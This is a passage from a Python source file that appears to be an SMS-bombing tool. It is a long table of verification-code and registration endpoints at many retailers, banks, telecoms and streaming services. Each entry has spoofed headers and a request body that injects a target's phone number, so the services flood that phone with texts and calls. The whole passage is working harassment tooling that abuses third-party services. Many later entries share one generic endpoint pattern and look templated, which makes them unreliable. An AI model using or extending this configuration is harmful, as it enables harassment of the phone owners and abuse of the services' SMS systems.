        "headers": lambda: get_common_headers("https://www.menu.ua/", "https://www.menu.ua", "application/x-www-form-urlencoded"),
        "data": lambda p: {"user_info[fullname]": "Test", "user_info[phone]": p, "user_info[email]": "test@gmail.com", "user_info[password]": "Password123", "user_info[conf_password]": "Password123"},
        "success_check": lambda r: True
    },
    "api171": {
        "name": "LogisticTech",
        "url": "https://api-rest.logistictech.ru/api/v1.1/clients/request-code",
        "method": "POST",
        "headers": lambda: {"Restaurant-chain": "c0ab3d88-fba8-47aa-b08d-c7598a3be0b9", "User-Agent": ua.random, "Content-Type": "application/json"},
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api172": {
        "name": "LoanyUA",
        "url": "https://loany.com.ua/funct/ajax/registration/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://loany.com.ua/", "https://loany.com.ua", "application/x-www-form-urlencoded"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api173": {
        "name": "Lenta",
        "url": "https://lenta.com/api/v1/authentication/requestValidationCode",
        "method": "POST",
        "headers": lambda: get_common_headers("https://lenta.com/", "https://lenta.com"),
        "data": lambda p: {"phone": f"+{p}"},
        "success_check": lambda r: True
    },
    "api174": {
        "name": "KoronaPay",
        "url": "https://koronapay.com/transfers/online/api/users/otps",
        "method": "POST",
        "headers": lambda: get_common_headers("https://koronapay.com/", "https://koronapay.com", "application/x-www-form-urlencoded"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api175": {
        "name": "Kinoland",
        "url": "https://api.kinoland.com.ua/api/v1/service/send-sms",
        "method": "POST",
        "headers": lambda: {"Agent": "website", "User-Agent": ua.random, "Content-Type": "application/json"},
        "data": lambda p: {"Phone": p, "Type": 1},
        "success_check": lambda r: True
    },
    "api176": {
        "name": "KFCApp",
        "url": "https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kfc.ru/", "https://kfc.ru"),
        "data": lambda p: {"phone": f"+{p}"},
        "success_check": lambda r: True
    },
    "api177": {
        "name": "KaspiKZ",
        "url": "https://kaspi.kz/util/send-app-link",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kaspi.kz/", "https://kaspi.kz", "application/x-www-form-urlencoded"),
        "data": lambda p: {"address": p[1:]},
        "success_check": lambda r: True
    },
    "api178": {
        "name": "Karusel",
        "url": "https://app.karusel.ru/api/v1/phone/",
        "method": "POST",
        "headers": lambda: get_common_headers("https://karusel.ru/", "https://karusel.ru"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api179": {
        "name": "IziUA",
        "url": "https://izi.ua/api/auth/register",
        "method": "POST",
        "headers": lambda: get_common_headers("https://izi.ua/", "https://izi.ua"),
        "data": lambda p: {"phone": f"+{p}", "name": "Test", "is_terms_accepted": True},
        "success_check": lambda r: True
    },
    "api180": {
        "name": "IviRU",
        "url": "https://api.ivi.ru/mobileapi/user/register/phone/v6",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ivi.ru/", "https://ivi.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api181": {
        "name": "Ingosstrakh",
        "url": "https://www.ingos.ru/api/v1/lk/auth/register/fast/step2",
        "method": "POST",
        "headers": lambda: {"Referer": "https://www.ingos.ru/cabinet/registration/personal", "User-Agent": ua.random, "Content-Type": "application/json"},
        "data": lambda p: {"Birthday": "1986-07-10T07:19:56.276+02:00", "DocIssueDate": "2004-02-05T07:19:56.276+02:00", "DocNumber": 500000, "DocSeries": 5000, "FirstName": "Test", "Gender": "M", "LastName": "Test", "SecondName": "Test", "Phone": p[1:], "Email": "test@gmail.com"},
        "success_check": lambda r: True
    },
    "api182": {
        "name": "Indriver",
        "url": "https://terra-1.indriverapp.com/api/authorization?locale=ru",
        "method": "POST",
        "headers": lambda: get_common_headers("https://indriverapp.com/", "https://indriverapp.com", "application/x-www-form-urlencoded"),
        "data": lambda p: {"mode": "request", "phone": f"+{p}", "phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"},
        "success_check": lambda r: True
    },
    "api183": {
        "name": "Imgur",
        "url": "https://api.imgur.com/account/v1/phones/verify",
        "method": "POST",
        "headers": lambda: get_common_headers("https://imgur.com/", "https://imgur.com"),
        "data": lambda p: {"phone_number": p, "region_code": "RU"},
        "success_check": lambda r: True
    },
    "api184": {
        "name": "HelsiUA",
        "url": "https://helsi.me/api/healthy/accounts/login",
        "method": "POST",
        "headers": lambda: get_common_headers("https://helsi.me/", "https://helsi.me"),
        "data": lambda p: {"phone": p, "platform": "PISWeb"},
        "success_check": lambda r: True
    },
    "api185": {
        "name": "Flipkart",
        "url": "https://www.flipkart.com/api/5/user/otp/generate",
        "method": "POST",
        "headers": lambda: {"Origin": "https://www.flipkart.com", "User-Agent": ua.random, "Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p: {"loginId": f"+{p}"},
        "success_check": lambda r: True
    },
    "api186": {
        "name": "FixPrice",
        "url": "https://fix-price.ru/ajax/register_phone_code.php",
        "method": "POST",
        "headers": lambda: get_common_headers("https://fix-price.ru/", "https://fix-price.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: {"register_call": "Y", "action": "getCode", "phone": f"+{p}"},
        "success_check": lambda r: True
    },
    "api187": {
        "name": "Finam",
        "url": "https://www.finam.ru/api/smslocker/sendcode",
        "method": "POST",
        "headers": lambda: get_common_headers("https://finam.ru/", "https://finam.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: {"phone": f"+{p}"},
        "success_check": lambda r: True
    },
    "api188": {
        "name": "ETM",
        "url": "https://www.etm.ru/cat/runprog.html",
        "method": "POST",
        "headers": lambda: get_common_headers("https://etm.ru/", "https://etm.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: {"m_phone": p[1:], "mode": "sendSms", "syf_prog": "clients-services", "getSysParam": "yes"},
        "success_check": lambda r: True
    },
    "api189": {
        "name": "EGroshi",
        "url": "https://e-groshi.com/online/reg",
        "method": "POST",
        "headers": lambda: get_common_headers("https://e-groshi.com/", "https://e-groshi.com", "application/x-www-form-urlencoded"),
        "data": lambda p: {"first_name": "Test", "last_name": "Test", "third_name": "Test", "phone": p, "password": "Password123", "password2": "Password123"},
        "success_check": lambda r: True
    },
    "api190": {
        "name": "Edostav",
        "url": "https://vladimir.edostav.ru/site/CheckAuthLogin",
        "method": "POST",
        "headers": lambda: get_common_headers("https://edostav.ru/", "https://edostav.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: {"phone_or_email": f"+{p}"},
        "success_check": lambda r: True
    },
    "api191": {
        "name": "EasyPayUA",
        "url": "https://api.easypay.ua/api/auth/register",
        "method": "POST",
        "headers": lambda: get_common_headers("https://easypay.ua/", "https://easypay.ua"),
        "data": lambda p: {"phone": p, "password": "Password123"},
        "success_check": lambda r: True
    },
    "api192": {
        "name": "DianetUA",
        "url": "https://my.dianet.com.ua/send_sms/",
        "method": "POST",
        "headers": lambda: get_common_headers("https://dianet.com.ua/", "https://dianet.com.ua", "application/x-www-form-urlencoded"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api193": {
        "name": "Delitime",
        "url": "https://api.delitime.ru/api/v2/signup",
        "method": "POST",
        "headers": lambda: get_common_headers("https://delitime.ru/", "https://delitime.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: {"SignupForm[username]": p, "SignupForm[device_type]": 3},
        "success_check": lambda r: True
    },
    "api194": {
        "name": "Creditter",
        "url": "https://api.creditter.ru/confirm/sms/send",
        "method": "POST",
        "headers": lambda: get_common_headers("https://creditter.ru/", "https://creditter.ru"),
        "data": lambda p: {"phone": p, "type": "register"},
        "success_check": lambda r: True
    },
    "api195": {
        "name": "Cleversite",
        "url": "https://clients.cleversite.ru/callback/run.php",
        "method": "POST",
        "headers": lambda: get_common_headers("https://cleversite.ru/", "https://cleversite.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: {"siteid": "62731", "num": p, "title": "Онлайн-консультант", "referrer": "https://m.cleversite.ru/call"},
        "success_check": lambda r: True
    },
    "api196": {
        "name": "City24UA",
        "url": "https://city24.ua/personalaccount/account/registration",
        "method": "POST",
        "headers": lambda: get_common_headers("https://city24.ua/", "https://city24.ua", "application/x-www-form-urlencoded"),
        "data": lambda p: {"PhoneNumber": p},
        "success_check": lambda r: True
    },
    "api197": {
        "name": "Citilink",
        "url": "https://www.citilink.ru/registration/confirm/phone/+{phone}/",
        "method": "POST",
        "headers": lambda: get_common_headers("https://citilink.ru/", "https://citilink.ru"),
        "data": None,
        "success_check": lambda r: True
    },
    "api198": {
        "name": "Cinema5",
        "url": "https://cinema5.ru/api/phone_code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://cinema5.ru/", "https://cinema5.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api199": {
        "name": "Cian",
        "url": "https://api.cian.ru/sms/v1/send-validation-code/",
        "method": "POST",
        "headers": lambda: get_common_headers("https://cian.ru/", "https://cian.ru"),
        "data": lambda p: {"phone": f"+{p}", "type": "authenticateCode"},
        "success_check": lambda r: True
    },
    "api200": {
        "name": "Benzuber",
        "url": "https://app.benzuber.ru/login",
        "method": "POST",
        "headers": lambda: get_common_headers("https://benzuber.ru/", "https://benzuber.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: {"phone": f"+{p}"},
        "success_check": lambda r: True
    },
    "api201": {
        "name": "Bartokyo",
        "url": "https://bartokyo.ru/ajax/login.php",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bartokyo.ru/", "https://bartokyo.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: {"user_phone": p},
        "success_check": lambda r: True
    },
    "api202": {
        "name": "BamperBY",
        "url": "https://bamper.by/registration/?step=1",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bamper.by/", "https://bamper.by", "application/x-www-form-urlencoded"),
        "data": lambda p: {"phone": f"+{p}", "submit": "Запросить смс подтверждения", "rules": "on"},
        "success_check": lambda r: True
    },
    "api203": {
        "name": "Avtobzvon",
        "url": "https://avtobzvon.ru/request/makeTestCall?to={phone}",
        "method": "GET",
        "headers": lambda: get_common_headers("https://avtobzvon.ru/", "https://avtobzvon.ru"),
        "data": None,
        "success_check": lambda r: True
    },
    "api204": {
        "name": "AzbukaVkus",
        "url": "https://oauth.av.ru/check-phone",
        "method": "POST",
        "headers": lambda: get_common_headers("https://av.ru/", "https://av.ru"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api205": {
        "name": "AnytimeGlobal",
        "url": "https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",
        "method": "POST",
        "headers": lambda: get_common_headers("https://anytime.global/", "https://anytime.global", "application/x-www-form-urlencoded"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api206": {
        "name": "AptekaRU",
        "url": "https://apteka.ru/_action/auth/getForm/",
        "method": "POST",
        "headers": lambda: get_common_headers("https://apteka.ru/", "https://apteka.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: {"form[NAME]": "", "form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "", "form[EMAIL]": "", "form[LOGIN]": p, "form[PASSWORD]": "Password123", "get-new-password": "Получите пароль по SMS", "user_agreement": "on", "personal_data_agreement": "on", "formType": "simple", "utc_offset": "120"},
        "success_check": lambda r: True
    },
    "api207": {
        "name": "Zadarma",
        "url": "https://my.zadarma.com/connect/",
        "method": "POST",
        "headers": lambda: get_common_headers("https://my.zadarma.com/", "https://my.zadarma.com", "application/x-www-form-urlencoded; charset=UTF-8"),
        "data": lambda p: f"?number=+{p}",
        "success_check": lambda r: True
    },
    "api208": {
        "name": "FindClone",
        "url": "https://findclone.ru/register",
        "method": "GET",
        "headers": lambda: get_common_headers("https://findclone.ru/", "https://findclone.ru"),
        "data": None,
        "success_check": lambda r: True
    },
    "api209": {
        "name": "Dostaevsky",
        "url": "https://msk.dostaevsky.ru/ajax/feedback/",
        "method": "POST",
        "headers": lambda: get_common_headers("https://msk.dostaevsky.ru/", "https://msk.dostaevsky.ru", "application/x-www-form-urlencoded; charset=UTF-8"),
        "data": lambda p: f"back_call=+{p}",
        "success_check": lambda r: True
    },
    "api210": {
        "name": "Grab",
        "url": "https://p.grabtaxi.com/api/passenger/v2/profiles/register",
        "method": "POST",
        "headers": lambda: {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36", "Content-Type": "application/json"},
        "data": lambda p: {"phoneNumber": p, "countryCode": "ID", "name": "test", "email": "mail@mail.com", "deviceToken": "*"},
        "success_check": lambda r: True
    },
    "api211": {
        "name": "RuTaxi",
        "url": "https://moscow.rutaxi.ru/ajax_keycode.html",
        "method": "POST",
        "headers": lambda: get_common_headers("https://moscow.rutaxi.ru/", "https://moscow.rutaxi.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: f"l={p}",
        "success_check": lambda r: True
    },
    "api212": {
        "name": "BelkaCar",
        "url": "https://belkacar.ru/get-confirmation-code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://belkacar.ru/", "https://belkacar.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: f"phone={p}",
        "success_check": lambda r: True
    },
    "api213": {
        "name": "StarPizzaCafe",
        "url": "https://starpizzacafe.com/mods/a.function.php",
        "method": "POST",
        "headers": lambda: get_common_headers("https://starpizzacafe.com/", "https://starpizzacafe.com", "application/x-www-form-urlencoded"),
        "data": lambda p: f"aj=50&registration-phone={p}",
        "success_check": lambda r: True
    },
    "api214": {
        "name": "Tinkoff",
        "url": "https://api.tinkoff.ru/v1/sign_up",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.tinkoff.ru/", "https://www.tinkoff.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: f"phone=+{p}",
        "success_check": lambda r: True
    },
    "api215": {
        "name": "Dostavista",
        "url": "https://dostavista.ru/backend/send-verification-sms",
        "method": "POST",
        "headers": lambda: get_common_headers("https://dostavista.ru/", "https://dostavista.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: f"phone={p}",
        "success_check": lambda r: True
    },
    "api216": {
        "name": "MonoBank",
        "url": "https://www.monobank.com.ua/api/mobapplink/send",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.monobank.com.ua/", "https://www.monobank.com.ua", "application/json"),
        "data": lambda p: {"phone": f"+{p}"},
        "success_check": lambda r: True
    },
    "api217": {
        "name": "YandexEda",
        "url": "https://eda.yandex.ru/api/v1/user/request_code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://eda.yandex.ru/", "https://eda.yandex.ru", "application/json"),
        "data": lambda p: {"phone_number": f"+{p}"},
        "success_check": lambda r: True
    },
    "api218": {
        "name": "DeliveryClub",
        "url": "https://www.delivery-club.ru/ajax/user_otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.delivery-club.ru/", "https://www.delivery-club.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: f"phone={p}",
        "success_check": lambda r: True
    },
    "api219": {
        "name": "KinoPoisk",
        "url": "https://www.kinopoisk.ru/passport/login/",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.kinopoisk.ru/", "https://www.kinopoisk.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: f"phone={p}",
        "success_check": lambda r: True
    },
    "api220": {
        "name": "Citilink",
        "url": "https://www.citilink.ru/registration/",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.citilink.ru/", "https://www.citilink.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: f"phone={p}",
        "success_check": lambda r: True
    },
    "api221": {
        "name": "MTS",
        "url": "https://login.mts.ru/amserver/UI/Login",
        "method": "POST",
        "headers": lambda: get_common_headers("https://login.mts.ru/", "https://login.mts.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: f"IDToken1={p}",
        "success_check": lambda r: True
    },
    "api222": {
        "name": "Megafon",
        "url": "https://lk.megafon.ru/api/sendsms/",
        "method": "POST",
        "headers": lambda: get_common_headers("https://lk.megafon.ru/", "https://lk.megafon.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api223": {
        "name": "Beeline",
        "url": "https://moskva.beeline.ru/api/otp/",
        "method": "POST",
        "headers": lambda: get_common_headers("https://moskva.beeline.ru/", "https://moskva.beeline.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api224": {
        "name": "Tele2",
        "url": "https://msk.tele2.ru/api/validation/number",
        "method": "POST",
        "headers": lambda: get_common_headers("https://msk.tele2.ru/", "https://msk.tele2.ru", "application/json"),
        "data": lambda p: {"number": p},
        "success_check": lambda r: True
    },
    "api225": {
        "name": "YouDo",
        "url": "https://youdo.com/api/v1/sendsms",
        "method": "POST",
        "headers": lambda: get_common_headers("https://youdo.com/", "https://youdo.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api226": {
        "name": "SberMarket",
        "url": "https://sbermarket.ru/api/v1/auth/phone",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sbermarket.ru/", "https://sbermarket.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api227": {
        "name": "KFC",
        "url": "https://sapi.kfc.ru/api/v1/common/auth/send-code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.kfc.ru/", "https://www.kfc.ru", "application/json"),
        "data": lambda p: {"phone": f"+{p}"},
        "success_check": lambda r: True
    },
    "api228": {
        "name": "BurgerKing",
        "url": "https://burgerking.ru/api/v1/user/signup",
        "method": "POST",
        "headers": lambda: get_common_headers("https://burgerking.ru/", "https://burgerking.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api229": {
        "name": "VTB",
        "url": "https://www.vtb.ru/api/auth/send-code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.vtb.ru/", "https://www.vtb.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api230": {
        "name": "AlfaBank",
        "url": "https://click.alfabank.ru/api/v2/security/sms",
        "method": "POST",
        "headers": lambda: get_common_headers("https://click.alfabank.ru/", "https://click.alfabank.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api231": {
        "name": "Qiwi",
        "url": "https://qiwi.com/auth/verification/send.action",
        "method": "POST",
        "headers": lambda: get_common_headers("https://qiwi.com/", "https://qiwi.com", "application/x-www-form-urlencoded"),
        "data": lambda p: f"username=+{p}",
        "success_check": lambda r: True
    },
    "api232": {
        "name": "Utair",
        "url": "https://www.utair.ru/api/v1/user/reset",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.utair.ru/", "https://www.utair.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api233": {
        "name": "KaroFilm",
        "url": "https://karofilm.ru/api/v1/auth/sms",
        "method": "POST",
        "headers": lambda: get_common_headers("https://karofilm.ru/", "https://karofilm.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api234": {
        "name": "Incanto",
        "url": "https://incanto.eu/index.php?route=account/register",
        "method": "POST",
        "headers": lambda: get_common_headers("https://incanto.eu/", "https://incanto.eu", "application/x-www-form-urlencoded"),
        "data": lambda p: f"telephone={p}",
        "success_check": lambda r: True
    },
    "api235": {
        "name": "Sunlight",
        "url": "https://sunlight.net/api/v3/auth/send-code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sunlight.net/", "https://sunlight.net", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api236": {
        "name": "Telem24",
        "url": "https://tele2.ru/api/auth/reminder",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tele2.ru/", "https://tele2.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api237": {
        "name": "Mvideo",
        "url": "https://www.mvideo.ru/api/v1/users/login",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.mvideo.ru/", "https://www.mvideo.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api238": {
        "name": "Eldorado",
        "url": "https://www.eldorado.ru/personal/register.php",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.eldorado.ru/", "https://www.eldorado.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: f"phone={p}",
        "success_check": lambda r: True
    },
    "api239": {
        "name": "Pyaterochka",
        "url": "https://5ka.ru/api/v1/services/registration/send-code/",
        "method": "POST",
        "headers": lambda: get_common_headers("https://5ka.ru/", "https://5ka.ru", "application/json"),
        "data": lambda p: {"phone": f"+{p}"},
        "success_check": lambda r: True
    },
    "api240": {
        "name": "Perekrestok",
        "url": "https://www.perekrestok.ru/api/v1/auth/otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.perekrestok.ru/", "https://www.perekrestok.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api241": {
        "name": "Lenta",
        "url": "https://lenta.com/api/v1/auth/request-sms-code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://lenta.com/", "https://lenta.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api242": {
        "name": "Auchan",
        "url": "https://www.auchan.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.auchan.ru/", "https://www.auchan.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api243": {
        "name": "Magnit",
        "url": "https://magnit.ru/api/v1/verification/phone",
        "method": "POST",
        "headers": lambda: get_common_headers("https://magnit.ru/", "https://magnit.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api244": {
        "name": "SportMaster",
        "url": "https://www.sportmaster.ru/user/login.do",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.sportmaster.ru/", "https://www.sportmaster.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: f"phone={p}",
        "success_check": lambda r: True
    },
    "api245": {
        "name": "Hoff",
        "url": "https://hoff.ru/api/v1/auth/send_code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://hoff.ru/", "https://hoff.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api246": {
        "name": "Vseinstrumenti",
        "url": "https://www.vseinstrumenti.ru/ajax/auth/send_code/",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.vseinstrumenti.ru/", "https://www.vseinstrumenti.ru", "application/x-www-form-urlencoded"),
        "data": lambda p: f"phone={p}",
        "success_check": lambda r: True
    },
    "api247": {
        "name": "LeroyMerlin",
        "url": "https://leroymerlin.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://leroymerlin.ru/", "https://leroymerlin.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api248": {
        "name": "Petрович",
        "url": "https://petrovich.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://petrovich.ru/", "https://petrovich.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api249": {
        "name": "Ozon",
        "url": "https://www.ozon.ru/api/composer-api.bx/_default/portal/action",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.ozon.ru/", "https://www.ozon.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api250": {
        "name": "Wildberries",
        "url": "https://ligin.wildberries.ru/login/api/v1/phone",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.wildberries.ru/", "https://www.wildberries.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api251": {
        "name": "Lamoda",
        "url": "https://www.lamoda.ru/api/v1/auth/send-code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.lamoda.ru/", "https://www.lamoda.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api252": {
        "name": "SberDevices",
        "url": "https://sberdevices.ru/api/v1/auth",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sberdevices.ru/", "https://sberdevices.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api253": {
        "name": "KinopoiskHD",
        "url": "https://hd.kinopoisk.ru/api/v1/auth/otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://hd.kinopoisk.ru/", "https://hd.kinopoisk.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api254": {
        "name": "Okko",
        "url": "https://okko.tv/api/v1/users/signup",
        "method": "POST",
        "headers": lambda: get_common_headers("https://okko.tv/", "https://okko.tv", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api255": {
        "name": "IVI",
        "url": "https://www.ivi.ru/rating/auth",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.ivi.ru/", "https://www.ivi.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api256": {
        "name": "Wink",
        "url": "https://wink.rt.ru/api/v2/users/signup",
        "method": "POST",
        "headers": lambda: get_common_headers("https://wink.rt.ru/", "https://wink.rt.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api257": {
        "name": "Megogo",
        "url": "https://megogo.net/ru/auth/sendCode",
        "method": "POST",
        "headers": lambda: get_common_headers("https://megogo.net/", "https://megogo.net", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api258": {
        "name": "YandexMusic",
        "url": "https://music.yandex.ru/api/v2/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://music.yandex.ru/", "https://music.yandex.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api259": {
        "name": "YandexDrive",
        "url": "https://drive.yandex.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://drive.yandex.ru/", "https://drive.yandex.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api260": {
        "name": "YandexMarket",
        "url": "https://market.yandex.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://market.yandex.ru/", "https://market.yandex.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api261": {
        "name": "YandexTravel",
        "url": "https://travel.yandex.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://travel.yandex.ru/", "https://travel.yandex.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api262": {
        "name": "Avito",
        "url": "https://www.avito.ru/api/1/auth/send",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.avito.ru/", "https://www.avito.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api263": {
        "name": "CIAN",
        "url": "https://www.cian.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.cian.ru/", "https://www.cian.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api264": {
        "name": "DomClick",
        "url": "https://domclick.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://domclick.ru/", "https://domclick.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api265": {
        "name": "BankSaintPetersburg",
        "url": "https://bspb.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bspb.ru/", "https://bspb.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api266": {
        "name": "Raiffeisen",
        "url": "https://www.raiffeisen.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.raiffeisen.ru/", "https://www.raiffeisen.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api267": {
        "name": "Rosbank",
        "url": "https://www.rosbank.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.rosbank.ru/", "https://www.rosbank.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api268": {
        "name": "Promsvyazbank",
        "url": "https://www.psbank.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.psbank.ru/", "https://www.psbank.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api269": {
        "name": "Sovcombank",
        "url": "https://sovcombank.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sovcombank.ru/", "https://sovcombank.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api270": {
        "name": "Gazprombank",
        "url": "https://www.gazprombank.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.gazprombank.ru/", "https://www.gazprombank.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api271": {
        "name": "PostBank",
        "url": "https://www.postbank.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.postbank.ru/", "https://www.postbank.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api272": {
        "name": "RenaissanceCredit",
        "url": "https://rencredit.ru/api/v1/auth/code",
        "method": "POST",
